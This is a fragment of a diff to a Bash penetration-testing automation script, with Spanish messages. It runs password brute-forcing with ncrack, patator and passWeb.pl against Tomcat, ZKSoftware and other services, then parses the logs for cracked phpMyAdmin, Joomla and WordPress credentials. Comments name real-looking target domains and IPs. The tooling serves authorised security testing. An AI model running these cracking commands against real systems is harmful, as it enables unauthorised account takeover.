+			passWeb.pl -s http -t $ip -p $port -m ZKSoftware -u administrator -f passwords.txt >> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordZKSoftware.txt
+			grep --color=never 'encontrado' logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordZKSoftware.txt | tee -a .vulnerabilidades/"$ip"_"$port-$path_web_sin_slash"_passwordZKSoftware.txt
 			echo ""			
 		done
 		insert_data
@@ -934,7 +927,7 @@ if [[ "$MODE" == "total" ]] ; then
 				free_ram=`free -m | grep -i mem | awk '{print $7}'`		
 				script_instancias=$((`ps aux | egrep 'patator|medusa|ncrack' | wc -l` - 1)) 							
 				if [[ $free_ram -gt $MIN_RAM && $script_instancias -lt $MAX_SCRIPT_INSTANCES  ]];then 										
-					ncrack --user "$admin_user" -P passwords.txt -g cd=8 $ip:$port | tee -a  logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
+					ncrack --user "$admin_user" -P passwords.txt -g cd=8 $ip:$port | tee -a  logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt &
 					echo ""				
 					break
 				else								
@@ -973,7 +966,7 @@ then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`	
 		echo -e "[+] Parse $ip:$port"	
-		grep --color=never "$admin_user" logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+		grep --color=never "$admin_user" logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt 2>/dev/null
 	done
 fi	
 
@@ -1019,7 +1012,7 @@ then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "[+] Parse $ip:$port"				
-		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null					
+		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt 2>/dev/null					
 	 done	
 	insert_data
 fi
@@ -1067,25 +1060,26 @@ then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "[+] Parse $ip:$port"				
-		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt 2>/dev/null
 	 done	
 	insert_data
 fi
 
 
 
-old_ifs="$IFS"
-IFS=$'\n'  # make newlines the only separator     
 
-if [ -f servicios/admin-web-fingerprint.txt ]
+#PARSE
+if [ -f servicios/admin-web-fingerprint-inserted.txt ]
 then	  		  
-	echo -e "$OKBLUE #################### PARSE (`wc -l servicios/admin-web-fingerprint.txt`) ######################$RESET"	    
-	for line in $(cat servicios/admin-web-fingerprint.txt); do	
-		IFS=$old_ifs
-		ip_port_path=`echo $line | cut -d ";" -f 1` #https://www.sanmateo.com.bo/wp-login.php https://www.sanmateo.com.bo:8443/wp-login.php		
+	echo -e "$OKBLUE #################### PARSE (`wc -l servicios/admin-web-fingerprint-inserted.txt`) ######################$RESET"	    
+
+	
+	while IFS= read -r line 
+	do
+		ip_port_path=`echo $line | cut -d ";" -f 1` #https://200.58.87.208:443/wp-login.php
 		fingerprint=`echo $line | cut -d ";" -f 2`
-		echo -e "\n\t########### $ip_port_path #######"	
-		
+		echo -e "\n\t########### "$ip_port_path #######"	
+			
 		host_port=`echo $ip_port_path | cut -d "/" -f 3` # 190.129.69.107  - 190.129.69.107:8080
 		proto_http=`echo $ip_port_path | cut -d ":" -f 1`
 		if [[ ${host_port} == *":"* ]]; then
@@ -1100,40 +1094,45 @@ then
 		host=`echo $host_port | cut -d ":" -f 1`				
 		path_web=`echo $ip_port_path | cut -d "/" -f 4-5`	
 		path_web=`echo "/"$path_web`
+		path_web_sin_slash=$(echo "$path_web" | tr -d '/')
 
-		egrep --color=never -i 'Password encontrado|sistema sin password' logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt 2>/dev/null | sort | uniq > .vulnerabilidades/"$host"_"$port"_passwordPhpMyadmin.txt	 
+
+		egrep --color=never -i 'Password encontrado|sistema sin password' logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt 2>/dev/null | sort | uniq > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt	 
 		
 		if [[ $fingerprint = *"joomla"* ]]; then
-			grep --color=never 'Successful login' logs/cracking/"$host"_"$port"_passwordCMS.txt 2>/dev/null| sort | uniq > .vulnerabilidades/"$host"_"$port"_passwordCMS.txt 
+			grep --color=never 'Successful login' logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordCMS.txt 2>/dev/null| sort | uniq > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_passwordCMS.txt 
 		fi
 
+		if [[ $fingerprint = *"wordpress"* ]]; then
+			grep --color=never -ia 'Credenciales' logs/cracking/"$host"_*_passwordCMS.txt 2>/dev/null  > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_passwordCMS.txt
+		fi
 
 		if [[ $fingerprint = *'tomcat admin'* ]]; then
 		
-			egrep -iq "INFO - 200" logs/cracking/"$host"_"$port"_passwordAdminWeb.txt 
+			egrep -iq "INFO - 200" logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt 
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then			
 				echo -e "\t\t[i] Password encontrado"				
 								
 				# 09:55:46 patator    INFO - 200  22077:-1       0.522 | tomcat:s3cret                      |    25 | HTTP/1.1 200
-				creds=`grep --color=never "INFO - 200" logs/cracking/"$host"_"$port"_passwordAdminWeb.txt  | cut -d "|" -f 2 | tr -d ' '`
-				echo "$ip_port_path (Creds $creds)" > .vulnerabilidades/"$host"_"$port"_passwordAdminWeb.txt 
+				creds=`grep --color=never "INFO - 200" logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt  | cut -d "|" -f 2 | tr -d ' '`
+				echo "$ip_port_path (Creds $creds)" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt 
 			else
 				echo -e "\t\t[+] Bruteforcing passwords (user=tomcat)"	
-				#echo "patator.py http_fuzz method=GET url="$ip_port_path user_pass=tomcat:FILE0 0=passwords.txt -e user_pass:b64 --threads=3" >> logs/cracking/"$host"_"$port"_passwordAdminWeb.txt  				
-				patator.py http_fuzz method=GET url=$ip_port_path user_pass=tomcat:FILE0 0=passwords.txt -e user_pass:b64 --threads=3 > logs/cracking/"$host"_"$port"_passwordAdminWeb.txt  2>> logs/cracking/"$host"_"$port"_passwordAdminWeb.txt 	
-				egrep -iq "INFO - 200" logs/cracking/"$host"_"$port"_passwordAdminWeb.txt 
+				#echo "patator.py http_fuzz method=GET url="$ip_port_path user_pass=tomcat:FILE0 0=passwords.txt -e user_pass:b64 --threads=3" >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt  				
+				patator.py http_fuzz method=GET url=$ip_port_path user_pass=tomcat:FILE0 0=passwords.txt -e user_pass:b64 --threads=3 > logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt  2>> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt 	
+				egrep -iq "INFO - 200" logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt 
 				greprc=$?
 				if [[ $greprc -eq 0 ]] ; then			
 					echo -e "\t\t[i] Password encontrado"
 					# 12:56:35 patator.py    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
-					password=`grep --color=never "INFO - 200" logs/cracking/"$host"_"$port"_passwordAdminWeb.txt  | cut -d "|" -f 2 | tr -d ' '`
-					echo "$ip_port_path \(Usuario:tomcat Password:$password\)" > .vulnerabilidades/"$host"_"$port"_passwordAdminWeb.txt 
+					password=`grep --color=never "INFO - 200" logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt  | cut -d "|" -f 2 | tr -d ' '`
+					echo "$ip_port_path \(Usuario:tomcat Password:$password\)" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt 
 				fi
 			fi																							
 		fi	
 
-	done
+	done < servicios/admin-web-fingerprint-inserted.txt	
 	insert_data
 fi
 
